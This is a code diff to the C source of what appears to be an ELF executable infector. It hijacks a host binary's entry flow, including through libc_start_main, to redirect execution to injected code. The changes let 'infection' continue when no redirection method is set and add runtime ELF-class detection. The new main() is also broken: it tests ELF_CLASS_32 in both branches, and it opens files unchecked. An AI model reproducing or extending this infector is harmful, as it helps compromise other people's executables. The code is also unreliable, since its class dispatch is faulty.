@@ -60,7 +60,8 @@ int elfit32(opts_t *opts)
                 break;
             default:
                 printf("[-] no redirection method chosen\n");
-                exit(1);
+                printf("continuing infection process\n");
+                patch_off = -1;
          }
     }
 
@@ -124,8 +125,10 @@ int elfit32(opts_t *opts)
     if (opts->redirection_method == STARTMAIN_REDIR)
         patch_off = libc_start_main_hijack_32(&host, opts->startmain_mode, &patch_addr);
 
-    printf("[+ APPLYING REDIRECTION]\n");
-    commit_redirect_32(&host, patch_off, malpoint);
+    if (patch_off != -1) {
+      printf("[+ APPLYING REDIRECTION]\n");
+      commit_redirect_32(&host, patch_off, malpoint);
+    }
 
     unload_host(&host);
     return 1;
@@ -192,6 +195,7 @@ int elfit64(opts_t *opts)
             default:
                 printf("[-] no redirection method chosen\n");
                 printf("continuing infection process\n");
+                patch_off = -1;
          }
     }
 
@@ -263,13 +267,37 @@ int elfit64(opts_t *opts)
     if (opts->redirection_method == STARTMAIN_REDIR)
         patch_off = libc_start_main_hijack_64(&host, opts->startmain_mode, &patch_addr);
 
-    printf("[+ APPLYING REDIRECTION]\n");
-    commit_redirect_64(&host, patch_off, malpoint);
+    if (patch_off != -1) {
+      printf("[+ APPLYING REDIRECTION]\n");
+      commit_redirect_64(&host, patch_off, malpoint);
+    }
 
     unload_host(&host);
     return 1;
 }
 
+int get_elf_class(char *filename)
+{
+    if (!filename)
+    {
+        return -1;
+    }
+
+    // read elf class
+    char header[5];
+    FILE *in = fopen(filename, "rb");
+    int num_bytes = fread(header, 1, 5, in);
+    fclose(in);
+
+    // return the elf class
+    if (num_bytes < 5)
+    {
+        return -1;
+    }
+
+    return (int) header[4];
+
+}
 
 int main(int argc, char *argv[])
 {
@@ -280,10 +308,18 @@ int main(int argc, char *argv[])
         exit(-1);
     }
     /* TODO Integrity check host for section header table */
-
-#ifdef __i386__
-    return elfit32(opts);
-#else
-    return elfit64(opts);
-#endif
+    int elf_class = get_elf_class(opts->host);
+    if (elf_class == ELF_CLASS_32)
+    {
+        return elfit32(opts);
+    }
+    else if (elf_class == ELF_CLASS_32)
+    {
+        return elfit64(opts);
+    }
+    else
+    {
+        return -1;
+    }
 }
+
